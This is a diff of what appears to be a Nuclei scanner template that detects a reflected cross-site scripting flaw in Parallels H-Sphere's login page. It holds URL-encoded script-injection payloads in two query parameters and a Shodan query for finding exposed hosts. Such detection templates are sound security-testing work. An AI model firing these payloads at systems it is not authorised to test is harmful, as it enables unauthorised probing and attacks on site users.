@@ -1,7 +1,6 @@
 id: parallels-hsphere-xss
-
 info:
-  name: Parallels H-Sphere - Cross-Site Scripting
+  name: Parallels H-Sphere - Cross-Site Scripting(XSS)
   author: ritikchaddha
   severity: medium
   description: |
@@ -11,27 +10,22 @@ info:
   metadata:
     verified: true
     shodan-query: title:"h-sphere"
-  tags: hsphere,xss,edb,parallels
-
+  tags: parallels,hsphere,xss
 requests:
   - method: GET
     path:
       - '{{BaseURL}}/webshell4/login.php?err=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
       - '{{BaseURL}}/webshell4/login.php?login=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
-
     stop-at-first-match: true
     matchers-condition: and
     matchers:
-
       - type: word
         words:
           - 'value="\"><script>alert(document.domain)</script>'
-
       - type: word
         part: header
         words:
           - "text/html"
-
       - type: status
         status:
           - 200
